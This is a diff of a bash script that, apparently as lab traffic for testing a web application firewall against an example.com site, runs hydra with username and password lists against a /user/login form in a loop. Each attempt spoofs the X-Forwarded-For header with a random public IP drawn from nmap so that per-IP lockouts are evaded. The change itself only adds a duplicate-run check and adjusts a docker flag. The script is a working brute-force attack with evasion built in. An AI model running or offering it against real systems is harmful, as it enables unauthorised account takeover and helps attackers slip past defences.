@@ -1,4 +1,13 @@
 #!/bin/bash
+# Uncomment set command below for code debuging bash
+# set -x
+
+already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
+if [  $already -gt 2 ]; then
+    echo -e "The script is already running `expr $already - 2` time."
+    #killall $(basename "$0")
+    exit 1
+fi
 
 sitefqdn[1]="site40.example.com"
 
@@ -26,7 +35,7 @@ do
             for i in {1..5}
             do
                 xff=$(nmap -n -iR 1 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.- -sL | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
-                sudo docker run -t -i asm-brute-force hydra -V -L users10.txt -P pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account:H=X-forwarded-for: $xff"
+                sudo docker run -t asm-brute-force hydra -V -L users10.txt -P pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account:H=X-forwarded-for: $xff"
             done
 
         fi
